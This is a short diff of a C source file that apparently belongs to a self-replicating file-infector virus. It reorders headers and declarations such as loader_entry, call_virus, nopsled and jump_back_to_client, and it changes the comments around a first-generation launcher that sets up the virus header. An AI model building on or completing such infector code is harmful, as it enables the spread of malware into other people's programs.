@@ -1,13 +1,11 @@
-
-#include "syscall.h"
 #include "virus.h"
-#include "virus_header.h"
+#include "syscalls.h"
 
-void	virus_header_struct(void);
 void	loader_entry(void);
 void	call_virus(void);
 void	nopsled(void);
 void	jump_back_to_client(void);
+void	virus_header_struct(void);
 void	loader_exit(void);
 
 /*
@@ -15,10 +13,9 @@ void	loader_exit(void);
 **   - it is launched instead of the loader for the first run
 **   - it is NOT copied into infected files (unlike the loader and virus)
 */
-
 void	_start(void)
 {
-	/* 1st generation values */
+	// 1st generation values
 	struct virus_header	vhdr = {
 		.seed                = 0xfadedbade1f5eed5,
 		.full_virus_size     = (size_t)_start - (size_t)loader_entry,
